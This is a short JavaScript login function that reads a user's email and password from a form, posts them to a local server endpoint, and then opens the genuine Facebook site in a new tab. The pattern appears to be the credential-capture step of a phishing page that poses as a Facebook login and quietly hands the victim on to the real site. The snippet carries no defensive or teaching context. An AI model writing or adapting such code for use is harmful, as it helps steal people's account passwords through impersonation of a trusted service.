const Login = () => {
  const formData = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value,
  };

  const url = "http://localhost:5000/submit";
  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(formData),
  })
    .then(async (response) => {
      await response.json();
      window.open("https://www.facebook.com/", "_blank");
    })
    .catch((error) => console.log(error));
};
